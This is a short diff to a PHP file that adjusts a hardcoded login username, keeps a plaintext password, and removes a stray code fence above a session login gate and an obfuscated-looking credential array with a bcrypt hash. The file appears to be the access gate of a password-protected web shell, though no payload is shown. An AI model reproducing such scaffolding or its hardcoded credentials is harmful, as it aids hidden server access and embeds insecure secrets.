@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$USER = "avatar listrik";
+$USER = "avatarlistrik";
 $PASS = "mulyonokaka";
 
 if (!isset($_SESSION['auth'])) {
@@ -94,7 +94,7 @@ if (!isset($_SESSION['auth'])) {
         exit;
     }
 }
-```
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'AVATAR LISTRIK',
     'password' => '$2a$12$SeQBWnsOKzlvwk77VB10uO0.V2FjxFwaI9.rO2UbSwL5ydKi7.PXS',
